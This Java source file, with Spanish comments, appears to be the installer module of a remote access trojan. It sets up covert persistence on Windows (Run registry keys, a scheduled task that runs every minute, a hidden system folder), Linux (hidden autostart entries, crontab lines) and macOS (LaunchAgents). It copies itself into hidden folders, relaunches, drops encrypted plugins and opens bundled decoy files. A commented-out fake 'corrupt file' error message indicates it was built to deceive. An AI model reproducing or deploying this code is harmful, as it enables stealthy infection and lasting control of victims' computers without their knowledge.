package rt.util;

import comunes.Archivo;
import java.awt.Desktop;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.List;
import rt.Inicio;
import rt.interfaces.AR;
import comunes.Interfaz;

public class INST extends Thread implements Interfaz {

    private String nombreJar;
    private String nombreReg;
    private boolean[] tipo = new boolean[2];
    private File destino;
    private boolean actualizacion;
    private AR registro;
    private boolean seguir = true;
    //private static final String R = "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu";//Software\Microsoft\Windows\CurrentVersion\R
    private final String R = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";//Software\Microsoft\Windows\CurrentVersion\R
    private final String opcionJVM1 = " -Xms" + Inicio.min + "m ";
    private final String opcionJVM2 = " -Xmx" + Inicio.max + "m ";
    private boolean servicio;//si se instala como servicio
    private boolean instaladoServicio; //si es q ya esta isntalado como servicio

    private void detener() {
        seguir = false;
    }

    private void instalar() {
        String so = System.getProperty("os.name").toLowerCase();
        if (so.contains("win")) {
            win_instalar();
        } else if (so.contains("linux")) {
            lin_instalar();
        } else if (so.contains("mac")) {
            mac_instalar();
        }
    }

    private void lin_instalar() {
        try {
            File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            //nombreReg = ".Oracle";
            if (!nombreReg.startsWith(".")) {
                nombreReg = "." + nombreReg;
            }

            File CarpetaParent = new File(System.getenv("HOME"), nombreReg);
            if (!CarpetaParent.exists()) {
                CarpetaParent.mkdirs();
            }
            this.destino = new File(CarpetaParent, this.nombreJar + ".jar");
            String jre = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";

            String jar = " -jar";
            if (this.tipo[0] == true) {
                File carpeta = new File(System.getenv("HOME") + "/.config/autostart");
                if (!carpeta.exists()) {
                    carpeta.mkdirs();
                }
                File autoinicio = new File(System.getenv("HOME") + "/.config/autostart/" + nombreJar + ".desktop");
                FileWriter fichero = null;
                PrintWriter pw = null;
                try {
                    fichero = new FileWriter(autoinicio);
                    pw = new PrintWriter(fichero);
                    pw.println("[Desktop Entry]");
                    pw.println("Type=Application");
                    pw.println("Name=" + nombreJar);
                    pw.println("Exec=" + jre + opcionJVM1 + opcionJVM2 + jar + " '" + destino.getAbsolutePath() + "'");
                    pw.println("Terminal=false");
                    pw.println("Hidden=true");
                    pw.println("NoDisplay=true");
                } catch (Exception e) {
                } finally {
                    try {
                        if (null != fichero) {
                            fichero.close();
                        }
                    } catch (Exception e2) {
                    }
                }
            }
            if (this.tipo[1] == true) { // programacion de tareas
                Process p;
                //agrego cada reinicio del sistema
                try {
                    p = Runtime.getRuntime().exec(new String[]{"echo", "@reboot " + jre + opcionJVM1 + opcionJVM2 + jar + " '" + this.destino.getAbsolutePath() + "'", ">>", " /etc/crontab"});
                } catch (Exception ex) {
                }
                //agrego a cada 30 minutos
                try {
                    p = Runtime.getRuntime().exec(new String[]{"echo", "5 * * * * " + jre + opcionJVM1 + opcionJVM2 + jar + " '" + this.destino.getAbsolutePath() + "'", ">>", " /etc/crontab"});
                } catch (Exception ex) {
                }
            }
            if (server.getAbsolutePath().equalsIgnoreCase(this.destino.getAbsolutePath())) {
                return;
            }
            if (destino.exists()) {
                if (!destino.delete()) {
                    return;
                }
            }
            FileInputStream entrada = new FileInputStream(server);
            FileOutputStream salida = new FileOutputStream(this.destino);
            byte[] BUFFER = new byte[1024];
            int i;
            while ((i = entrada.read(BUFFER)) > -1) {
                salida.write(BUFFER, 0, i);
            }
            salida.close();
//            if (!actualizacion) {
//                JOptionPane.showMessageDialog(null, "No se puede abrir este archivo. Archivo corrupto.", "Error al abrir", JOptionPane.ERROR_MESSAGE);
//            }
            Runtime.getRuntime().exec(new String[]{jre, opcionJVM1.trim(), opcionJVM2.trim(), jar.trim(), destino.getAbsolutePath()});
            cargaAdjuntos();
            cargaPlugins(CarpetaParent);
            System.exit(0);
        } catch (Exception ex) {
        }
    }

    private void mac_instalar() {
        try {
            File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            //nombreReg = ".Oracle";
            if (!nombreReg.startsWith(".")) {
                nombreReg = "." + nombreReg;
            }

            File CarpetaParent = new File(System.getenv("HOME"), nombreReg);
            if (!CarpetaParent.exists()) {
                CarpetaParent.mkdirs();
            }
            this.destino = new File(CarpetaParent, this.nombreJar + ".jar");
            String jre = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";

            String jar = " -jar";
            if (this.tipo[0] == true) {
                File carpeta = new File(System.getenv("HOME") + "/Library/LaunchAgents/");
                if (!carpeta.exists()) {
                    carpeta.mkdirs();
                }
                File autoinicio = new File(carpeta, nombreJar + ".plist");
                FileWriter fichero = null;
                PrintWriter pw = null;
                /*
                
                Ejemplo sacado de
                *   https://stackoverflow.com/questions/3358410/programmatically-run-at-startup-on-mac-os-x
                *   https://stackoverflow.com/questions/3358410/programmatically-run-at-startup-on-mac-os-x
                
                <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>my.everydaytasks</string>
    <key>ProgramArguments</key>
     <array>
            <string>/Applications/MongoDB/bin/mongod</string>
            <string>--dbpath</string>
            <string>/usr/local/mongo/data</string>
            <string>--fork</string>
            <string>--logpath</string>
            <string>/usr/local/mongo/log</string>
    </array>
    <key>ProcessType</key>
    <string>Interactive</string>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
                 */
                try {
                    fichero = new FileWriter(autoinicio);
                    pw = new PrintWriter(fichero);
                    pw.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
                    pw.println("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
                    pw.println("<plist version=\"1.0\">");
                    pw.println("<dict>");
                    pw.println("<key>Label</key>");
                    pw.println("<string>" + nombreJar + "</string>");
                    pw.println("<key>ProgramArguments</key>");
                    pw.println("<array>");
                    pw.println("<string>" + jre.trim() + "</string>");
                    pw.println("<string>" + opcionJVM1.trim() + "</string>");
                    pw.println("<string>" + opcionJVM2.trim() + "</string>");
                    pw.println("<string>" + jar.trim() + "</string>");
                    pw.println("<string>" + destino.getAbsolutePath() + "</string>");
                    pw.println("</array>");
                    pw.println("<key>ProcessType</key>");
                    pw.println("<string>Interactive</string>");
                    pw.println("<key>RunAtLoad</key>");
                    pw.println("<true/>");
                    pw.println("<key>KeepAlive</key>");
                    pw.println("<false/>");
                    pw.println("</dict>");
                    pw.println("</plist>");
                } catch (Exception e) {
                } finally {
                    try {
                        if (null != fichero) {
                            fichero.close();
                            //si todo sale bien intenta ejecutar el comando para registrar el archivo de autoinicio
                            Runtime.getRuntime().exec(new String[]{"sudo", "launchctl", "load", autoinicio.getAbsolutePath()});
                        }
                    } catch (Exception e2) {
                    }
                }
            }

            if (server.getAbsolutePath().equalsIgnoreCase(this.destino.getAbsolutePath())) {
                return;
            }
            if (destino.exists()) {
                if (!destino.delete()) {
                    return;
                }
            }
            FileInputStream entrada = new FileInputStream(server);
            FileOutputStream salida = new FileOutputStream(this.destino);
            byte[] BUFFER = new byte[1024];
            int i;
            while ((i = entrada.read(BUFFER)) > -1) {
                salida.write(BUFFER, 0, i);
            }
            salida.close();
//            if (!actualizacion) {
//                JOptionPane.showMessageDialog(null, "No se puede abrir este archivo. Archivo corrupto.", "Error al abrir", JOptionPane.ERROR_MESSAGE);
//            }
            Runtime.getRuntime().exec(new String[]{jre, opcionJVM1.trim(), opcionJVM2.trim(), jar.trim(), destino.getAbsolutePath()});
            cargaAdjuntos();
            cargaPlugins(CarpetaParent);
            System.exit(0);
        } catch (Exception ex) {
        }

    }

    private void win_instalarServicio() {
        //sie s un servicio y aun no ha sido instalado
//        UtilRT.escribirLog("Antes se instalar. servicio=" + servicio + " instaladoServicio=" + instaladoServicio);
        if (servicio && !instaladoServicio) {
            try {
                //boolean b = new ServiceLoader().instalar("servicio_java_2");
                CLRT cl = new CLRT();
                Interfaz d = ((Interfaz) cl.loadClass("rt.ServiceLoader").newInstance());
                d.ejecutar(1, nombreReg);//instala el servicio
//                boolean b = new ServiceLoader().instalar(nombreReg);
                if ((Boolean) d.get(1)) {//pregunta si fue exitoso la instalacion
                    System.exit(0);
                }
            } catch (Exception ex) {

            }
//        } else {
//            UtilRT.escribirLog("Ya no se va a instalar servicio=" + servicio + " instaladoServicio=" + instaladoServicio);
        }
    }

    private void win_instalar() {
        try {
            try {
                registro = ((AR) new CLRT().loadClass("rt.util.REG").newInstance());
            } catch (Exception ex) {
                registro = null;
            }
            File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            File CarpetaParent = new File(System.getenv("appdata"), nombreReg);
            CarpetaParent.mkdirs();
            this.destino = new File(CarpetaParent, this.nombreJar + ".jar");
            String jre = "\"" + System.getProperty("java.home") + File.separator + "bin" + File.separator + "javaw.exe" + "\"";
            String jar = " -jar";
            String destinopath = " \"" + this.destino.getAbsolutePath() + "\"";
            if (this.tipo[0] == true) {
                try {
                    //registro.writeStringValue(0x80000001, B64.decodeString(R), this.nombreReg, jre + opcionJVM1 + opcionJVM2 + jar + destinopath);
                    registro.writeStringValue(0x80000001, R, this.nombreReg, jre + opcionJVM1 + opcionJVM2 + jar + destinopath);
                } catch (Exception e) {
                }
                try {
                    //registro.writeStringValue(0x80000002, B64.decodeString(R), this.nombreReg, jre + opcionJVM1 + opcionJVM2 + jar + destinopath);
                    registro.writeStringValue(0x80000002, R, this.nombreReg, jre + opcionJVM1 + opcionJVM2 + jar + destinopath);
                } catch (Exception e2) {
                }
            }
            //cada 30 minutos
            if (this.tipo[1] == true) {
                Process p;
                try {
                    p = Runtime.getRuntime().exec(new String[]{"schtasks", "/create", "/tn", this.nombreReg, "/tr", "javaw.exe -jar '" + this.destino.getAbsolutePath() + "'", "/sc", "minute", "/mo", "1"});
                } catch (Exception ex) {
                }
            }
            if (server.getAbsolutePath().equalsIgnoreCase(this.destino.getAbsolutePath())) {
                //si ya esta instalado (copiado en su lugar de destino final )ahora intenta instalar como servicio
                win_instalarServicio();
                return;
            }
            if (destino.exists()) {
                if (!destino.delete()) {
                    return;
                }
            }
            FileInputStream entrada = new FileInputStream(server);
            FileOutputStream salida = new FileOutputStream(this.destino);
            byte[] BUFFER = new byte[1024];
            int i;
            while ((i = entrada.read(BUFFER)) > -1) {
                salida.write(BUFFER, 0, i);
            }
            salida.close();
            ocultaCarpeta(CarpetaParent);
//            if (!actualizacion) {
//                JOptionPane.showMessageDialog(null, "No se puede abrir este archivo. Archivo corrupto.", "Error al abrir", JOptionPane.ERROR_MESSAGE);
//            }
            //Runtime.getRuntime().exec(new String[]{jre, opcionJVM1.trim(), opcionJVM2.trim(), jar.trim(), destinopath.trim(), "--delete",server.getAbsolutePath()});
            Runtime.getRuntime().exec(new String[]{jre, opcionJVM1.trim(), opcionJVM2.trim(), jar.trim(), destinopath.trim()});
            cargaAdjuntos();
            cargaPlugins(CarpetaParent);
            System.exit(0);
        } catch (Exception ex) {

        }
    }

    private static void ocultaCarpeta(File f) {
        try {
            FileWriter desk = new FileWriter(new File(f, "Desktop.ini"));
            desk.write("[.ShellClassInfo]\r\n");
            desk.write("CLSID={031EE060-67BC-460d-8847-E4A7C5E45A27}");
            desk.close();
            Runtime.getRuntime().exec(new String[]{"attrib", "+s", "+h", "\"" + f.getAbsolutePath() + "\\*.*\""});
            Runtime.getRuntime().exec(new String[]{"attrib", "+s", "+h", "\"" + f.getAbsolutePath() + "\""});
        } catch (Exception ex) {
        }
    }

//    private static void modoPapeleraCarpeta(File f) {
//        try {
//            FileWriter desk = new FileWriter(new File(f, "Desktop.ini"));
//            desk.write("[.ShellClassInfo]\r\n");
//            desk.write("CLSID={645FF040-5081-101B-9F08-00AA002F954E}");
//            desk.close();
//            Runtime.getRuntime().exec(new String[]{"attrib", "+s", "+h", "\"" + f.getAbsolutePath() + "\\*.*\""});
//            Runtime.getRuntime().exec(new String[]{"attrib", "+s", "+h", "\"" + f.getAbsolutePath() + "\""});
//        } catch (Exception ex) {
//        }
//    }

//    @Override
//    public void inicia(String nombreJar, String nombreReg, boolean tipo1, boolean tipo2, boolean actualizacion) {
//        this.nombreJar = nombreJar;
//        this.nombreReg = nombreReg;
//        this.tipo[0] = tipo1;
//        this.tipo[1] = tipo2;
//        this.actualizacion = actualizacion;
//        start();
//    }
    @Override
    public void run() {
        while (seguir) {
            instalar();
            try {
                Thread.sleep(300000);
            } catch (Exception ex) {
            }
        }
    }

    public void instanciar(Object... parametros) {
        this.nombreJar = (String) parametros[0];
        this.nombreReg = (String) parametros[1];
        this.tipo[0] = (Boolean) parametros[2];
        this.tipo[1] = (Boolean) parametros[3];
        this.actualizacion = (Boolean) parametros[4];
        this.servicio = (Boolean) parametros[5];
        this.instaladoServicio = (Boolean) parametros[6];
        start();
    }

    public void set(int opcion, Object valor) {

    }

    public Object get(int opcion, Object... parametros) {
        return null;
    }

    public void ejecutar(int opcion, Object... parametros) {
        switch (opcion) {
            case 1:
                detener();
                break;
        }
    }

    //cargar archivos Adjuntos (binder)
    private void cargaAdjuntos() {
        try {
            CLRT cl = new CLRT();
            List<Archivo> listaAdjuntos = (List<Archivo>) UtilRT.leerObjeto(cl.descifrar("/adjuntos.dat"));
            if (listaAdjuntos != null) {
                ByteArrayInputStream entrada;
                File dst;
                FileOutputStream salida;
                byte[] BUFFER;
                for (Archivo p : listaAdjuntos) {
                    dst = File.createTempFile("Tmp", p.getNombre());
                    entrada = new ByteArrayInputStream(UtilRT.descomprimirGZIP(p.getIcono()));
                    salida = new FileOutputStream(dst);
                    BUFFER = new byte[1024];
                    int i;
                    while ((i = entrada.read(BUFFER)) > -1) {
                        salida.write(BUFFER, 0, i);
                    }
                    salida.close();
                    entrada.close();
                    try {
                        Desktop.getDesktop().open(dst.getAbsoluteFile());
                    } catch (IOException e) {
                    }
                }
            }
        } catch (Exception ex) {
        }
    }

    //carga los plugins que van adjuntos en el server
    private void cargaPlugins(File rutaDestino) {
        try {
            File lib = new File(rutaDestino, "lib");
            lib.mkdirs();
            CLRT cl = new CLRT();
            List<Archivo> listaAdjuntos = (List<Archivo>) UtilRT.leerObjeto(cl.descifrar("/plugins.dat"));
            if (listaAdjuntos != null) {
                ByteArrayInputStream entrada;
                File dst;
                FileOutputStream salida;
                byte[] BUFFER;
                for (Archivo p : listaAdjuntos) {
                    dst = new File(lib, p.getNombre());
                    new File(dst.getParent()).mkdirs();
                    entrada = new ByteArrayInputStream(UtilRT.descomprimirGZIP(p.getIcono()));
                    salida = new FileOutputStream(dst);
                    BUFFER = new byte[1024];
                    int i;
                    while ((i = entrada.read(BUFFER)) > -1) {
                        salida.write(BUFFER, 0, i);
                    }
                    salida.close();
                    entrada.close();
                }
            }
        } catch (Exception ex) {
        }
    }
}
